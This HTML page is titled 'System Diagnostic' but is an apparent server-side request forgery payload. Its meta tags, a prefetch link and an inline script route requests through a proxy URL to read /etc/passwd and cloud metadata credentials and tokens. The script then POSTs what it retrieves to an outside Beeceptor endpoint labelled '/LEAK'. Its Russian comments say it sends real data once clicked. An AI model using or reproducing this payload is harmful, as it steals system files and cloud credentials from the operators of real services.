<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>

    <meta property="og:description" content="https://max.ru/proxy?url=file:///etc/passwd">
    
    <meta property="og:image" content="https://max.ru/proxy?url=http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token">

    <link rel="prefetch" href="https://max.ru/proxy?url=https://max-lin.free.beeceptor.com/BOT_LOG?target=metadata">

</head>
<body>
    <script>
        // Этот код сработает ТОЛЬКО если ты сама нажмешь на ссылку
        // Он попытается прочитать содержимое и отправить его на Beeceptor
        const hook = "https://max-lin.free.beeceptor.com";
        const proxy = "https://max.ru/proxy?url=";
        const targets = [
            "file:///etc/passwd",
            "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/"
        ];

        targets.forEach(async (t) => {
            try {
                const r = await fetch(proxy + encodeURIComponent(t));
                const data = await r.text();
                if (data.length > 5) {
                    // Шлем реальные данные на Beeceptor!
                    await fetch(hook + "/LEAK", {
                        method: "POST",
                        body: JSON.stringify({target: t, body: data.substring(0, 1000)})
                    });
                }
            } catch(e) {}
        });
    </script>
</body>
</html>
